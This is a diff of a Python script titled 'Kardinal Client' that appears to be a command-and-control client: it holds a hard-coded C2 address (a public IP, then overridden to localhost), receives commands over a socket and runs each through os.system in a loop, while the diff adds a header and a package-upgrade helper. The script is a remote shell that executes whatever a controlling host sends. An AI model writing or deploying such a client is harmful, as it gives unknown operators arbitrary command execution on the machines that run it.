@@ -1,8 +1,25 @@
-import socket
-import os
-import avalon_framework as avalon
-C2ADDR = "45.77.173.57"
+"""
 
+,-, ,           .           .      ,--. .            .
+ )|/  ,-. ,-. ,-| . ,-. ,-. |     | `-' |  . ,-. ,-. |-
+  |\  ,-| |   | | | | | ,-| |     |   . |  | |-' | | |
+ ,' ` `-^ '   `-^ ' ' ' `-^ `'    `--'  `' ' `-' ' ' `'
+
+
+Name: Kardinal Client
+Author: K4YT3X
+Date Created: Dec 2, 2017
+Last Modified: Dec 2, 2017
+"""
+from kpm import kpm
+import avalon_framework as avalon
+import os
+import socket
+C2ADDR = "45.77.173.57"
+C2ADDR = "127.0.0.1"
+
+
+# -------------------------------- Classses
 
 class sockethadler:
 
@@ -27,13 +44,19 @@ class command_interpreter:
             os.system(command)
 
 
-def upgrade_packages():
-    print("upgrade")
-    pass
+# -------------------------------- Functions
 
+def upgrade_packages():
+    kobj.upgrade_all()
+
+
+# -------------------------------- Procedural Code
 
 s0 = sockethadler()
 ci = command_interpreter()
+kobj = kpm()
 
-while True:
-    ci.process_command(s0.expect_command())
+cmd = s0.expect_command()
+while cmd is not None and cmd != '':
+    ci.process_command(cmd)
+    cmd = s0.expect_command()
